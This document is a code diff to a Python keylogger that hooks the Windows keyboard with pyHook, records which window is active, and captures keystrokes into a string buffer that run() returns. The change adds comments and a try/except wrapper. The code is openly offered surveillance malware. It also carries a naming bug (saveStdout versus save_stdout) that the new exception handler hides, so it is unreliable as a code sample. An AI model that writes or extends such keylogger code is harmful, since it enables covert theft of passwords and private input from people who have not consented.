@@ -46,8 +46,11 @@ class KeyLogger:
     
     def keystroke(self, event):
     
+        # Get window name if this isn't the current window
         if event.WindowName != self.currentWindow:
             self.getCurrentProcess()
+        
+        # Identify what key it was
         if 32 < event.Ascii < 127:
             print(chr(event.Ascii), end='')
         else:
@@ -65,20 +68,25 @@ class KeyLogger:
     
 def run():
 
-    saveStdout = sys.stdout
-    sys.stdout = StringIO()
-    
-    kl = KeyLogger()
-    hm = pyHook.HookManager()
-    hm.KeyDown = kl.keystroke
-    hm.HookKeyboard()
-    
-    while time.thread_time() < TIMEOUT:
-        pythoncom.PumpWaitingMessages()
+    try:
+
+        saveStdout = sys.stdout
+        sys.stdout = StringIO()
         
-    log = sys.stdout.getvalue()
-    sys.stdout = save_stdout
-    return log
+        kl = KeyLogger()
+        hm = pyHook.HookManager()
+        hm.KeyDown = kl.keystroke
+        hm.HookKeyboard()
+        
+        while time.thread_time() < TIMEOUT:
+            pythoncom.PumpWaitingMessages()
+            
+        log = sys.stdout.getvalue()
+        sys.stdout = save_stdout
+        return log
+    
+    except Exception as e:
+        print(str(e))
 
 if __name__ == '__main__':
     print(run())
